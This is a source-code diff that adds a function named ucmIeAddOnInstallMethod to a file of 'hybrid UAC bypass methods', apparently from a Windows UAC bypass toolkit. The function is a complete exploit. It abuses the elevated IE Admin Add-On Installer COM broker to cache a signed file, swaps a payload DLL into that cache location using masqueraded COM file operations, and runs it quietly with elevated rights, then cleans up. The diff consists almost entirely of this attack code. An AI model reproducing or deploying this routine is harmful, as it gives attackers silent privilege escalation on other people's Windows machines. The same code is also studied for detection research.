@@ -4,9 +4,9 @@
 *
 *  TITLE:       HYBRIDS.C
 *
-*  VERSION:     3.50
+*  VERSION:     3.51
 *
-*  DATE:        11 Oct 2020
+*  DATE:        16 Oct 2020
 *
 *  Hybrid UAC bypass methods.
 *
@@ -1584,6 +1584,231 @@ NTSTATUS ucmNICPoisonMethod(
 
         supHeapFree(lpTargetFileName);
     }
+
+    return MethodResult;
+}
+
+/*
+* ucmIeAddOnInstallMethod
+*
+* Purpose:
+*
+* Bypass UAC by IE Admin Add-On Installer COM object.
+* Original author link: https://github.com/AzAgarampur/byeintegrity2-uac
+*
+*/
+NTSTATUS ucmIeAddOnInstallMethod(
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize
+)
+{
+    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
+    HRESULT  r = E_FAIL, hr_init;
+
+    IIEAdminBrokerObject* BrokerObject = NULL;
+    IActiveXInstallBroker* InstallBroker = NULL;
+
+    BSTR adminInstallerUuid = NULL;
+    BSTR cacheItemFilePath = NULL, fileToVerify = NULL;
+
+    ULONG dummy = 0;
+    PUCHAR dummyPtr = NULL;
+
+    PWCHAR lpPayloadFile = NULL, lpTargetDir = NULL, lpFileName = NULL, lpDirectory = NULL;
+    SIZE_T cchBuffer;
+
+    HANDLE processHandle = NULL;
+
+    BSTR workdirBstr;
+
+    WCHAR szDummyTarget[MAX_PATH * 2];
+
+    hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
+
+    do {
+
+        if (!supReplaceDllEntryPoint(
+            ProxyDll,
+            ProxyDllSize,
+            FUBUKI_DEFAULT_ENTRYPOINT,
+            TRUE))
+        {
+            break;
+        }
+
+        //
+        // VerifyFile required.
+        //
+        r = CoInitializeSecurity(NULL,
+            -1,
+            NULL,
+            NULL,
+            RPC_C_AUTHN_LEVEL_CONNECT,
+            RPC_C_IMP_LEVEL_IMPERSONATE,
+            NULL,
+            0,
+            NULL);
+
+        if (FAILED(r)) {
+            break;
+        }
+
+        //
+        // Allocated elevated factory object.
+        //
+        r = ucmAllocateElevatedObject(T_CLSID_IEAAddonInstaller,
+            &IID_IEAxiAdminInstaller,
+            CLSCTX_LOCAL_SERVER,
+            &BrokerObject);
+
+        if (FAILED(r)) {
+            break;
+        }
+
+        r = BrokerObject->lpVtbl->InitializeAdminInstaller(BrokerObject,
+            NULL,
+            0,
+            &adminInstallerUuid);
+
+        if (FAILED(r)) {
+            break;
+        }
+
+        //
+        // Query install broker object.
+        //
+        r = BrokerObject->lpVtbl->QueryInterface(BrokerObject,
+            &IID_IEAxiInstaller2,
+            &InstallBroker);
+
+        if (FAILED(r)) {
+            break;
+        }
+
+        _strcpy(szDummyTarget, g_ctx->szSystemDirectory);
+        _strcat(szDummyTarget, CONSENT_EXE);
+
+        r = E_FAIL;
+
+        //
+        // Verify image embedded signature.
+        // Uppon success copy given file to the temporary directory and return full filepath.
+        //
+        fileToVerify = SysAllocString(szDummyTarget);
+        if (fileToVerify) {
+
+            r = InstallBroker->lpVtbl->VerifyFile(InstallBroker,
+                adminInstallerUuid,
+                (HWND)INVALID_HANDLE_VALUE,
+                fileToVerify,
+                fileToVerify,
+                NULL,
+                WTD_UI_NONE,
+                WTD_UICONTEXT_EXECUTE,
+                &IID_IUnknown,
+                &cacheItemFilePath,
+                &dummy,
+                &dummyPtr);
+
+            if (dummyPtr)
+                CoTaskMemFree(dummyPtr);
+
+            SysFreeString(fileToVerify);
+        }
+
+        if (FAILED(r)) {
+            break;
+        }
+
+        //
+        // Kill file in cache
+        //
+        if (!ucmMasqueradedDeleteDirectoryFileCOM(cacheItemFilePath))
+            break;
+
+        //
+        // Replace file in cache with Fubuki.
+        //
+        cchBuffer = (SIZE_T)SysStringLen(cacheItemFilePath);
+        lpPayloadFile = (PWCHAR)supHeapAlloc(cchBuffer * 2);
+        if (lpPayloadFile == NULL)
+            break;
+
+        lpTargetDir = (PWCHAR)supHeapAlloc(cchBuffer * 2);
+        if (lpTargetDir == NULL)
+            break;
+
+        lpFileName = _filename(cacheItemFilePath);
+        if (lpFileName == NULL)
+            break;
+
+        _strcpy(lpPayloadFile, g_ctx->szTempDirectory);
+        _strcat(lpPayloadFile, lpFileName);
+
+        if (!supWriteBufferToFile(lpPayloadFile, ProxyDll, ProxyDllSize))
+            break;
+
+        lpDirectory = _filepath(cacheItemFilePath, lpTargetDir);
+        if (lpDirectory == NULL)
+            break;
+
+        if (!ucmMasqueradedMoveCopyFileCOM(lpPayloadFile, lpDirectory, TRUE))
+            break;
+
+        //
+        // Run file from cache.
+        //
+        workdirBstr = SysAllocString(g_ctx->szTempDirectory);
+        if (workdirBstr) {
+
+            r = InstallBroker->lpVtbl->RunSetupCommand(InstallBroker,
+                adminInstallerUuid,
+                NULL,
+                cacheItemFilePath,
+                TEXT(""),
+                workdirBstr,
+                TEXT(""),
+                4, //RSC_FLAG_QUIET
+                &processHandle); //there is always no process handle on output, ignore.
+
+            SysFreeString(workdirBstr);
+
+            if (r == E_INVALIDARG)
+                MethodResult = STATUS_SUCCESS;
+        }
+
+    } while (FALSE);
+
+    //
+    // Post execution cleanup.
+    //
+
+    if (InstallBroker)
+        InstallBroker->lpVtbl->Release(InstallBroker);
+
+    if (BrokerObject)
+        BrokerObject->lpVtbl->Release(BrokerObject);
+
+    if (adminInstallerUuid)
+        SysFreeString(adminInstallerUuid);
+
+    if (MethodResult == STATUS_SUCCESS) {
+        if (lpDirectory) {
+            ucmMasqueradedDeleteDirectoryFileCOM(lpDirectory);
+        }
+    }
+
+    if (cacheItemFilePath)
+        SysFreeString(cacheItemFilePath);
+
+    if (lpTargetDir)
+        supHeapFree(lpTargetDir);
+
+    if (lpPayloadFile)
+        supHeapFree(lpPayloadFile);
+
+    if (hr_init == S_OK)
+        CoUninitialize();
 
     return MethodResult;
 }
